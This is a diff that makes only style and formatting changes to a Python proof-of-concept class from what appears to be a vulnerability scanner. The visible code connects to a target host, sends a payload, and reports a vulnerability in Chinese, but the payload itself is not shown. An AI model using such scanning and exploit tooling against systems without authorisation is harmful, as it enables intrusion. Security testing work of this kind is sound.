@@ -48,9 +48,10 @@ class Poc(ABPoc):
                 }
             }
         }
-                    
+
     def verify(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
@@ -134,8 +135,8 @@ class Poc(ABPoc):
                 print("[+] Connected.")
 
             except:
-                print(("[+] Unable to connect to host " + \
-                    HOST + " on port " + str(PORT) + "."))
+                print(("[+] Unable to connect to host " +
+                       HOST + " on port " + str(PORT) + "."))
                 s.close()
                 # print "[+] Exiting."
                 exit(0)
@@ -147,7 +148,7 @@ class Poc(ABPoc):
             # print "[+] Sending our payload..."
             s.send(request)
             # print "[+] Done."
-            #print "Our data: %r" % request
+            # print "Our data: %r" % request
             self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                 target=self.target, name=self.vuln.name))
             s.close()
